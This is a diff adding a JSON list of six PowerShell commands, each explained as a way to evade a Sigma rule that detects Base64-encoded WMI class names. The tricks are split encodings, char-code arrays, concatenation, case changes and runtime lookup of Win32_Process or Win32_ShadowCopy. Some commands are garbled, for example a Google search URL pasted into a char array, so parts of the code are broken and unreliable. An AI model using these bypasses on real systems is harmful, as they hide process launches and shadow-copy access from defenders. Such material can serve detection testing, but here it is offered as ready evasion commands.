@@ -1,0 +1,26 @@
+[
+  {
+    "output": "powershell.exe -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V2luMzJf')) + [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHJvY2Vzcw=='))\"",
+    "explanation": "The Sigma rule relies on static string matching for common Base64 representations of WMI class names. By splitting the Base64 string into two separate parts and concatenating them at runtime, the command-line string no longer matches any of the hardcoded patterns (e.g., 'V2luMzJfUHJvY2Vzc'), effectively bypassing the detection while achieving the same result."
+  },
+  {
+    "output": "powershell.exe -Command \"Get-WmiObject -Class ([char[]](https://www.google.com/search?q=87,105,110,51,50,95,80,114,111,99,101,115,115) -join '')\"",
+    "explanation": "This bypass avoids Base64 entirely by using an array of ASCII character codes to reconstruct the string 'Win32\\_Process' dynamically. Since the Sigma rule specifically targets Base64-encoded signatures, this method bypasses the selection criteria."
+  },
+  {
+    "output": "powershell.exe -Command \"$w='Win32\\_'; $p='Process'; Get-CimInstance -ClassName ($w+$p)\"",
+    "explanation": "Simple string concatenation of the plaintext class name avoids both the Base64 signatures and the direct plaintext strings (if they were monitored). The rule specifically looks for Base64 blobs within the CommandLine field; breaking the blob prevents the regex/contains match from triggering."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand JABjACAAPQAgACcAVwBpAG4AMwAyAF8AJwAgACsAIAAnAFAAcgBvAGMAZQBzAHMAJwA7ACAASQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzACAAJABjACAALQBOAGEAbQBlACAAQwByAGUAYQB0AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAEkAcwB0ACAAIgBjAGEAbABjAC4AZQB4AGUAIgA=",
+    "explanation": "The Sigma rule relies on exact string matching of the Base64 representations of specific WMI classes (e.g., Win32_Process). This bypass splits the string into two halves ('Win32_' + 'Process') inside the PowerShell payload. When this concatenated script is Base64 encoded for the -EncodedCommand parameter, the signature strings targeted by the Sigma rule never appear in the final encoded payload."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzACAAdwBJAG4AMwAyAF8AcAByAE8AYwBlAFMAcwAgAC0ATgBhAG0AZQAgAEMAcgBlAGEAdABlACAALQBBAHIAZwB1AG0AZQBuAHQATABJAHMAdAAgACIAYwBhAGwAYwAuAGUAeABlACIA",
+    "explanation": "PowerShell and WMI class names are case-insensitive. The Sigma rule hardcodes the Base64 equivalents of standard PascalCase format (e.g., Win32_Process). By simply altering the capitalization of the class name in the script to 'wIn32_prOceSs' before converting it to UTF-16LE Base64, the resulting encoded string completely changes, successfully evading the hardcoded rule selections."
+  },
+  {
+    "output": "powershell.exe -e JABjAGwAYQBzAHMAIAAoAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAgAC0AEwAaQBzAHQAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAJABfAC4ATgBhAG0AZQAgAC0AbQBhAHQAYwBoACAAIgBeAFcAaQBuADMAMgBfAFMAaABhAGQAbwB3AEMAbwBwAHkAJAAiAH0AKQAuAE4AYQBtAGUA",
+    "explanation": "Instead of explicitly passing the string 'Win32_ShadowCopy', this bypass queries the system for available WMI objects using Get-WmiObject -List, filters via regex for the target class name, and dynamically extracts it at runtime. The Base64 string of this entire script does not contain the static encoded signatures the rule is looking for."
+  }
+]
